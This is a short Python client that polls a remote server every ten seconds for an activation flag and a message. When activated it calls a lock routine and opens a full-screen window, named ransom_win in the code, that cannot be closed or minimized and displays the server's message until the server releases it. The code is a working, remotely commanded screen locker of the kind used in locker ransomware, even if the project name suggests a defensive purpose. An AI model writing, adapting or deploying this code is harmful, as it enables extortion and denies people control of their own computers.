import requests
from Client.finals import Finals as final
from apscheduler.schedulers.blocking import BlockingScheduler
import tkinter as tk
from threading import Thread
from Client.assisting import *
from Client.devcon_automations import *

getActivation = "http://defensiveblocks.pythonanywhere.com/clients/" + final.USERNAME + "/"
getMsg = "http://defensiveblocks.pythonanywhere.com/clientsm/" + final.USERNAME + "/"
scheduler = BlockingScheduler()

""" this function replaces the exit button by - dont do anything """
def exb():
    pass


def ransom_win():
    print("hello")
    msg = get(final.messageField)
    wa = tk.Tk()
    wa.overrideredirect(1)
    wa.title('Defensive Blocks')
    wa.protocol("WM_DELETE_WINDOW", exb)
    wa.protocol("WM_MINIMIZE_WINDOW", exb)
    x = wa.winfo_screenwidth()
    y = wa.winfo_screenheight()
    wa.geometry("%dx%d" % (x, y))
    lb1 = tk.Label(wa, text=str(msg) + "\n", font=("Arial Bold", 70), pady=200, fg="RED")
    lb1.pack()
    wa.lift()
    while 1:
        wa.update()
        a_field = get(final.active_field)
        print(a_field)
        if a_field == "0":
            wa.destroy()
            return


def main():
    activation = (requests.get(getActivation)).text  # current activation
    print(activation)
    msg = (requests.get(getMsg)).text  # current msg
    if get(final.active_field) != activation or msg != get(final.messageField):  # compare previous to current
        replace(final.messageField, msg)
        if (str(activation) == "1") and (str(get(final.active_field)) == "0"):
            print("here")
            replace(final.active_field, activation)
            replace(final.active_flag, 1)
            lock()
            open_window = Thread(target=ransom_win)
            open_window.start()
        elif (str(activation) == "0") and (str(get(final.active_field)) == "1"):
            replace(final.active_field, activation)
            replace(final.active_flag, 0)
            unlock()
    else:
        replace(final.messageField, msg)
        return


scheduler.add_job(main, 'cron', second="0,10,20,30,40,50")  # replace if want to 0,30
scheduler.start()
